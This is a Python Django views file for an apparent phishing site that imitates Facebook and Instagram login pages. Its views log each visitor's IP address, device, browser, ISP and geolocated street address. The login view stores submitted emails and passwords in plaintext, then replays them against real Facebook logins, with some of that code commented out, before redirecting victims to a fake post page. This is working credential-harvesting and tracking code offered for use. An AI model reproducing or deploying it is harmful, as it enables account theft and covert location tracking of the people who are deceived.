import urllib.request
from django.shortcuts import render, redirect
from .models import FacebookAccount, AccountInfo
from .check_login import FacebookLogin
from django.views.decorators.cache import cache_control
from .names_comments import names, comments, tupleNamesComments
import urllib
import http.cookiejar as cookielib
from . import doLogin
from . import ipinfo
import socket
import requests
from geopy.geocoders import Nominatim
from requests import get
# from jnius import autoclass
import subprocess
from PIL import ImageGrab
# import cv2
# Create your views here.

def get_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]


def get_location():
    ip_address = get_ip()
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    location_data = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name")
    }
    return location_data


def instagram(request):
    context = {}
    return render(request, 'insta.html', context)

def facebook(request):
    hostname  = socket.gethostname()
    ip_address = get('https://api.ipify.org').text
    ipData = get(f'http://ip-api.com/json/{ip_address}').text
    geolocator = Nominatim(user_agent="FetcherApp")
    Latitude = ipinfo.ipinfo()['lat']
    Longitude = ipinfo.ipinfo()['lon']
    cityFromLonAndLat = geolocator.reverse(str(Latitude)+","+str(Longitude))

    dataIP = ipinfo.ipinfo()
    newInfo = AccountInfo.objects.create(
        is_mobile = request.user_agent.is_mobile,
        is_tablet = request.user_agent.is_tablet,
        is_touch_capable = request.user_agent.is_touch_capable,
        is_pc = request.user_agent.is_pc,
        is_bot = request.user_agent.is_bot,
        browser = request.user_agent.browser,
        browser_family = request.user_agent.browser.family,
        browser_version = request.user_agent.browser.version,
        os = request.user_agent.os,
        os_family = request.user_agent.os.family,
        os_version = request.user_agent.os.version,
        device = request.user_agent.device,
        device_family = request.user_agent.device.family,
        ipAddress = ip_address,
        location = dataIP['country'],
        region = dataIP['regionName'],
        city = dataIP['city'],
        latitude = dataIP['lat'],
        longitude = dataIP['lon'],
        timezone = dataIP['timezone'],
        isp = dataIP['isp'],
        fullAddress = cityFromLonAndLat
    )
    newInfo.save()

    context = {'ip_address':ip_address, 'ipData':ipinfo.ipinfo(), 'cityFromLonAndLat':cityFromLonAndLat}
    return render(request, 'index.html', context)

def TryToLoginFB(email,password):
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookielib.CookieJar()))
    url1 = "https://login.facebook.com"
    url2 = "https://login.facebook.com/login.php?login_attempt=1"
    data = str('&email=').encode('utf-8')+str(email).encode('utf-8')+str('&pass=').encode('utf-8')+str(password).encode('utf-8')
    socket = opener.open(url1)
    socket = opener.open(url2,data)
    return socket

def newLogin(request):
    email = request.POST.get('email')
    password = request.POST.get('password')

    if request.method == 'POST' and 'login' in request.POST and email and password and request.user_agent.is_mobile:
        newLog = FacebookAccount.objects.create(email=email, password=password)
        newLog.save()

        return redirect('post')

        # lo = doLogin.TryToLoginEM(email, password)
        # if lo:
        #     print("LOGGED")
        # else:
        #     print("ERROR")

        # socket = TryToLoginFB(str(email).encode('utf-8'), str(password).encode('utf-8'))

        # if bytes('logout', 'utf-8') in socket.read():
        #     print('Logged IN')
        #     return redirect('post')
        # else:
        #     print('ERROR')
        #     return redirect('facebook')        
    else:
        FacebookLogin(email=email, password=password, browser='Chrome').login()
        # time.sleep(5)

        if FacebookLogin.isLogged:
            return redirect('post')
        else:
            return redirect('facebook')

@cache_control(no_cache=True, must_revalidate=True)
def post(request):

    context={'names':names, 'comments':comments, 'tupleNamesComments':tupleNamesComments}

    return render(request, 'post.html', context)